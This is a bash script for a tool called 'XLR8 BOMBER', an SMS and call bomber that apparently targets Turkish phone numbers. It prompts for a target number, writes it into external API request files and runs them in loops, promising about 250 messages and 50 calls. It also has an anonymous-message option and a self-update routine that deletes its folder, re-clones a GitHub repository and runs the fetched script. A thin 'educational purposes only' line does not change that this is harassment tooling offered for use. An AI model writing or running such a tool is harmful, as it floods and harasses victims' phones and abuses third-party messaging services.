#!/bin/bash
#---------------------------------
#        XLR8 BOMBER 2.0 !
#    Coded by Anubhav Kashyap
#   Dont try to Steal it Bitch
#---------------------------------

apt install wget -y
clear
just() {
clear
echo ""
echo ""
printf  "                \e[1;33m|C|O|N|N|E|C|T|I|N|G|"
echo ""
echo ""
echo ""
apt install figlet -y
}


wget -q --spider https://github.com/anubhavanonymous

if [ $? -eq 0 ]; then
    just
else
    clear
    echo -e "\e[1;34m‎‎‏‏ ‎"
    figlet -c XLR8 BOMB3R
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi



banner() {

echo -e "\e[1;34m‎‎‏‏‎ ‎"
#After \e[1;34m a blank character is used to give purple colour to banner
figlet -c XLR8 BOMB3R
sleep 1
echo -e "                                         \e[91mAuthor:Anubhav Kashyap(Adam çalanı sikerim yazmis agaa)"
sleep 1                                                        
echo -e "                                         \e[36mGroup:Deepweb Shadows"
echo ""

}

updatee() {
clear
apt install git -y
echo -e "\e[92m "
clear
figlet -c -f slant Updating Script
echo ""
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Requesting Update From Source...\e[93m"
sleep 2
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Request Attempt Successful..\e[93m"
sleep 1
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Updating Now...\e[93m"
sleep 1
echo ""
cd ..
rm -rf elitesmsbomber
git clone https://github.com/ardacan06/elitesmsbomber
cd elitesmsbomber
chmod +x xlr8.sh
clear
figlet -c -f slant Script Updated
sleep 1
echo ""
echo -e "        \e[92m[\e[91m~\e[92m]\e[91m Restarting XLR8 !\e[93m"
sleep 2
bash xlr8.sh
}



PW_WD=$(pwd)
cd model
cp headapis $PW_WD
cp tailapis $PW_WD
cp anonapi $PW_WD
cd ..

menu(){
echo ""
printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m\n"
read -p '---------------> ' targett
printf "\n"
echo $targett > targetlist.txt
printf ">~~~>\e[1;92m Starting Attack On +90$targett \e[0m<~~~<"
sleep 1
echo ""
echo ""
printf "\n"
printf "Press ctrl+c to quit ! \n"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Else it will automatically stop after 5 min\e[93m"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m After sending 250 msgs and 50 calls !!\e[93m"
echo ""
while read a; do
    echo ${a//€shushhi/$targett}
done < headapis > headapis.t
mv headapis{.t,}

while read a; do
    echo ${a//€shushhi/$targett}
done < tailapis > tailapis.t
mv tailapis{.t,}

for i in {1..4}
do bash headapis
done

for i in {1..26}
do bash tailapis
done

}


anonmsg(){
rm records.txt > /dev/null 2>&1
echo ""
printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter target  >>> \e[0m\n"
read -p '---------------> ' smstarget
printf "\e[1;92m[\e[0m xlr8\e[1;92m ]\e[0m \e[1;93mEnter Your Message  >>> \e[0m\n"
read -p '---------------> ' text
echo ""

while read a; do
    echo ${a//₹axx/$smstarget}
done < anonapi > anonapi.t
mv anonapi{.t,}
while read a; do
    echo ${a//€amsg/$text}
done < anonapi > anonapi.t
mv anonapi{.t,}
bash anonapi > records.txt
value=$( grep -o "true" records.txt)
if [[ $value = "true" ]]
then
echo ""
printf "\e[92m[\e[91m~\e[92m] \e[0m\e[44mSuccess !!\e[0m\n"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please be pateint, Msgs take some time to get delivered !!\e[93m"
echo ""
read -p "Press enter to continue... "
else
echo ""
printf "\e[92m[\e[91m~\e[92m] \e[0m\e[44mError 404 !\e[0m\n"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m This feature doesn't works sometimes !!\e[93m"
echo ""
echo -e "\e[92m[\e[91m~\e[92m]\e[93m Remember you can only send one msg per day !\e[93m"
echo ""
read -p "Press enter to continue... "
fi




}

menux() {
clear
apt install curl
clear
banner
sleep 1
date
echo "------------------------------"
printf "\e[1;33mSadece Eğitim Amaçlıdır !!\e[0m"
echo ""
echo "------------------------------"
echo -e "\e[34mThis Bomber Only Works In Turkey :)"
echo "------------------------------"
echo ""
sleep 1
printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
printf "\e[1;92m[\e[0m 2\e[1;92m ]\e[0m>>>\e[1;93m SEND ANONYMOUS MSG \e[0m\n"
printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m UPDATE \e[0m\n"
printf "\e[1;92m[\e[0m 4\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
printf "\n"
read -p 'Select Option !! >>> ' options

if [ "$options" -eq "1" ];then
        menu
fi
if [ "$options" -eq "2" ];then
        anonmsg
fi
if [ "$options" -eq "3" ];then
        updatee
fi

if [ "$options" -eq "4" ];then
        echo ""
        echo -e "\e[92m[\e[91m~\e[92m]\e[93m Thanks for Using XLR8 !\e[93m"
        echo ""
        exit
        exit
        exit
else
        menux
fi


}

menux
